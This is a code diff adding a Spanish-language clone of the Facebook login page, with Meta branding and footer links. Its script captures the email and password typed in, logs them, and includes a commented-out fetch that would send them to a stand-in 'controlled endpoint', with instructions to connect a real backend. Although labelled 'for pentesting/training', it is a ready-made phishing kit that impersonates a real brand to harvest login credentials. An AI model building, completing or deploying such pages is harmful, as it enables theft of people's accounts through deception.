@@ -1,0 +1,319 @@
+<DOCTYPE html>
+    <html lang="en">
+
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Facebook - Log In or Sign Up</title>
+        <style>
+            body {
+                font-family: Helvetica, Arial, sans-serif;
+                background-color: #f0f2f5;
+                margin: 0;
+                padding: 0;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                height: 100vh;
+                color: #1c1e21;
+                font-size: 12px;
+            }
+
+            .container {
+                display: flex;
+                max-width: 980px;
+                gap: 60px;
+                align-items: center;
+                justify-self: center;
+                margin-top: 100;
+                
+            }
+
+            .logo {
+                margin-bottom: 20px;
+            }
+
+            .logo img {
+                height: 106px;
+                margin: -28px;
+            }
+
+            .slogan {
+                font-size: 28px;
+                line-height: 32px;
+                width: 500px;
+            }
+
+            .login-box {
+                background-color: #fff;
+                padding: 20px;
+                border-radius: 8px;
+                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+                width: 80%;
+                text-align: center;
+            }
+
+            .login-box input {
+                width: 100%;
+                padding: 14px 16px;
+                margin-bottom: 12px;
+                border: 1px solid #dddfe2;
+                border-radius: 6px;
+                font-size: 17px;
+            }
+
+            .login-box input:focus {
+                outline: none;
+                border-color: #1877f2;
+                box-shadow: 0 0 0 2px #e7f3ff;
+            }
+
+            .login-button {
+                background-color: #1877f2;
+                color: white;
+                border: none;
+                border-radius: 6px;
+                font-size: 20px;
+                font-weight: bold;
+                padding: 12px;
+                width: 100%;
+                cursor: pointer;
+                margin-bottom: 16px;
+            }
+
+            .login-button:hover {
+                background-color: #166fe5;
+            }
+
+            .forgot-password {
+                text-align: center;
+                margin-bottom: 20px;
+            }
+
+            .forgot-password a {
+                color: #1877f2;
+                text-decoration: none;
+                font-size: 14px;
+            }
+
+            .forgot-password a:hover {
+                text-decoration: underline;
+            }
+
+            .divider {
+                border-bottom: 1px solid #dadde1;
+                margin: 20px 0;
+            }
+
+            .create-account {
+                background-color: #42b72a;
+                color: white;
+                border: none;
+                border-radius: 6px;
+                font-size: 17px;
+                font-weight: bold;
+                padding: 12px 16px;
+                cursor: pointer;
+                display: inline-block;
+            }
+
+            .create-account:hover {
+                background-color: #36a420;
+            }
+
+            .error-message {
+                color: #ff4d4f;
+                font-size: 13px;
+                margin-top: -8px;
+                margin-bottom: 12px;
+                text-align: left;
+                display: none;
+            }
+
+            .login-box-box {
+                display: flex;
+                flex-direction: column;
+            }
+
+            .mid p a {
+                color: black;
+                text-decoration: none;
+                font-weight: bold;
+                font-size: 14;
+            }
+
+            .mid p a:hover {
+                text-decoration: underline;
+            }
+
+            .mid p {
+                font-size: 14;
+                padding: 20;
+                text-align: center;
+            }
+
+            footer {
+                text-align: center;
+                padding: 20px;
+                background-color: white;
+            }
+
+            .footer-divider {
+                border-top: 1px solid #ccc;
+                margin: 10px auto;
+                width: 90%;
+            }
+
+            .languages,
+            .links {
+                margin: 10px 0;
+                display: flex;
+                flex-wrap: wrap;
+                justify-content: center;
+                gap: 10px;
+            }
+
+            .languages a,
+            .links a {
+                text-decoration: none;
+                color: #65676b;
+                font-size: 12px;
+            }
+
+            .languages a:hover,
+            .links a:hover {
+                text-decoration: underline;
+            }
+
+            .left-section {
+                display: flex;
+                flex-direction: column;
+                justify-content: center;
+                transform: translateY(-45px);
+            }
+
+            #pageFooter {
+                color: #737373;
+            }
+        </style>
+    </head>
+
+    <body>
+        <div class="container">
+            <div class="left-section">
+                <div class="logo">
+                    <img src="Images/image.png" alt="Facebook">
+                </div>
+                <div class="slogan">
+                    Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
+                </div>
+            </div>
+            <div class="login-box-box">
+                <div class="login-box">
+                    <form id="loginForm">
+                        <input type="text" id="email" placeholder="Correo electrónico o número de teléfono"
+                            autofocus="1" required>
+                        <div class="error-message" id="emailError">Por favor ingresa un número o email válido</div>
+                        <input type="password" id="password" placeholder="Contraseña" required>
+                        <div class="error-message" id="passwordError">La contraseña debe ser de al menos 6 caracteres.
+                        </div>
+                        <button type="submit" class="login-button">Iniciar sesión</button>
+                        <div class="forgot-password">
+                            <a href="#">Olvidaste tu contraseña?</a>
+                        </div>
+                        <div class="divider"></div>
+                        <button type="button" class="create-account">Crear cuenta nueva</button>
+                    </form>
+                </div>
+                <div class="mid">
+                    <p><a href="#">Crea una página</a> para una celebridad, una marca o un negocio.</p>
+                </div>
+            </div>
+
+        </div>
+        
+
+        <footer>
+            <div class="languages">
+                <a href="#">Español</a>
+                <a href="#">English (US)</a>
+                <a href="#">Français (France)</a>
+                <a href="#">Italiano</a>
+                <a href="#">Português (Brasil)</a>
+                <a href="#">Deutsch</a>
+                <a href="#">Türkçe</a>
+                <a href="#">العربية</a>
+                <a href="#">हिन्दी</a>
+                <a href="#">中文(简体)</a>
+                <a href="#">日本語</a>
+                <a href="#">+</a>
+            </div>
+
+            <div class="footer-divider"></div>
+
+            <div class="links">
+                <a href="#">Registrarte</a>
+                <a href="#">Iniciar sesión</a>
+                <a href="#">Messenger</a>
+                <a href="#">Facebook Lite</a>
+                <a href="#">Video</a>
+                <a href="#">Meta Pay</a>
+                <a href="#">Tienda de Meta</a>
+                <a href="#">Meta Quest</a>
+                <a href="#">Ray-Ban Meta</a>
+                <a href="#">Meta AI</a>
+                <a href="#">Instagram</a>
+                <a href="#">Threads</a>
+                <a href="#">Centro de información de votación</a>
+                <a href="#">Política de privacidad</a>
+                <a href="#">Centro de privacidad</a>
+                <a href="#">Información</a>
+                <a href="#">Crear anuncio</a>
+                <a href="#">Crear página</a>
+                <a href="#">Desarrolladores</a>
+                <a href="#">Empleo</a>
+                <a href="#">Cookies</a>
+                <a href="#">Opciones de anuncios</a>
+                <a href="#">Condiciones</a>
+                <a href="#">Ayuda</a>
+                <a href="#">Importación de contactos y no usuarios</a>
+            </div>
+            <div id="pageFooter">Meta © 2025</div>
+        </footer>
+
+        <script>
+            // Client-side validation (for realism)
+            document.getElementById('loginForm').addEventListener('submit', function (e) {
+                e.preventDefault();
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                let isValid = true;
+
+                // Validate email/phone
+                if (!email || !email.includes('@') && !/^\d+$/.test(email)) {
+                    document.getElementById('emailError').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('emailError').style.display = 'none';
+                }
+
+                // Validate password
+                if (!password || password.length < 6) {
+                    document.getElementById('passwordError').style.display = 'block';
+                    isValid = false;
+                } else {
+                    document.getElementById('passwordError').style.display = 'none';
+                }
+
+                // If valid, log data (for pentesting/training)
+                if (isValid) {
+                    console.log('Submitted:', { email, password }); // Replace with your logging mechanism
+                    alert('[Pentest] Form submitted (check console). Replace this with your backend endpoint.');
+                    // Example: Send to a controlled endpoint for testing
+                    // fetch('https://your-controlled-endpoint.com/log', { method: 'POST', body: JSON.stringify({ email, password }) });
+                }
+            });
+        </script>
+    </body>
+
+    </html>
